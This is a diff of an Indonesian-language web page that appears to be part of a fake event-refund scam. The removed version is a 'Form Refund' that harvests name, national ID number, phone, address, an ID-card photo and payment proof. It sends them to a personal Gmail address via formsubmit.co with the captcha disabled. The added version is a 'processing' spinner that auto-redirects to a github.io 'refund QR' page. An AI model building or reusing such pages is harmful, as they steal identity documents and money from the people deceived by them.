@@ -3,130 +3,55 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Form Refund</title>
+<title>Memproses...</title>
 
-<!-- Bootstrap CSS -->
+<!-- Bootstrap -->
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css">
 
 <style>
 body {
     background: #0d0d0d;
     color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
 }
 
-.card {
+.loader-box {
     background: #1a1a1a;
-    border: 2px solid orange;
+    padding: 30px;
     border-radius: 12px;
+    border: 2px solid orange;
 }
 
-.card h4 {
+.spinner-border {
+    width: 3rem;
+    height: 3rem;
     color: orange;
 }
 
-.btn-custom {
-    background: gray;
-    border: none;
-}
-
-.btn-custom.active {
-    background: orange;
-    color: #000;
+h4 {
+    margin-top: 20px;
+    color: orange;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container py-5">
-<div class="row justify-content-center">
-<div class="col-md-6">
-
-<div class="card p-4 shadow">
-
-<h4 class="text-center mb-4">
-Silahkan Lengkapi Data Diri Beserta Bukti Pembayaran
-</h4>
-
-<form action="https://formsubmit.co/eticketdigital00@gmail.com" method="POST" enctype="multipart/form-data">
-
-<!-- Redirect -->
-<input type="hidden" name="_next" value="https://soekarnofestrun2026-rgb.github.io/QR-Pengembalian-/">
-
-<!-- Disable captcha -->
-<input type="hidden" name="_captcha" value="false">
-
-<div class="form-group">
-<label>Nama Lengkap</label>
-<input type="text" name="Nama" class="form-control" required>
-</div>
-
-<div class="form-group">
-<label>NIK</label>
-<input type="number" name="NIK" class="form-control" required>
-</div>
-
-<div class="form-group">
-<label>E-mail</label>
-<input type="email" name="Email" class="form-control" required>
-</div>
-
-<div class="form-group">
-<label>No. Handphone</label>
-<input type="number" name="HP" class="form-control" required>
-</div>
-
-<div class="form-group">
-<label>Alamat Lengkap</label>
-<textarea name="Alamat" class="form-control" required></textarea>
-</div>
-
-<div class="form-group">
-<label>Tanggal Pembelian</label>
-<input type="date" name="Tanggal" class="form-control" required>
-</div>
-
-<div class="form-group">
-<label>Upload Foto KTP</label>
-<input type="file" name="KTP" class="form-control-file" accept="image/*" required>
-</div>
-
-<div class="form-group">
-<label>Upload Bukti Pembayaran</label>
-<input type="file" name="Bukti" class="form-control-file" accept="image/*" required>
-</div>
-
-<div class="form-check mt-3">
-<input type="checkbox" class="form-check-input" id="agree">
-<label class="form-check-label">
-Saya menyatakan bahwa data-data di atas benar dan dapat dipertanggungjawabkan.
-</label>
-</div>
-
-<button type="submit" id="btn" class="btn btn-custom btn-block mt-4" disabled>
-Kirim Data Refund
-</button>
-
-</form>
-</div>
-
-</div>
-</div>
+<div class="loader-box">
+    <div class="spinner-border" role="status"></div>
+    <h4>Memproses Data...</h4>
+    <p>Mohon tunggu, Anda akan dialihkan</p>
 </div>
 
 <script>
-const agree = document.getElementById("agree");
-const btn = document.getElementById("btn");
-
-agree.addEventListener("change", function(){
-    if(this.checked){
-        btn.disabled = false;
-        btn.classList.add("active");
-    } else {
-        btn.disabled = true;
-        btn.classList.remove("active");
-    }
-});
+// Redirect setelah 3 detik
+setTimeout(function(){
+    window.location.href = "https://soekarnofestrun2026-rgb.github.io/QR-Pengembalian-/";
+}, 3000);
 </script>
 
 </body>
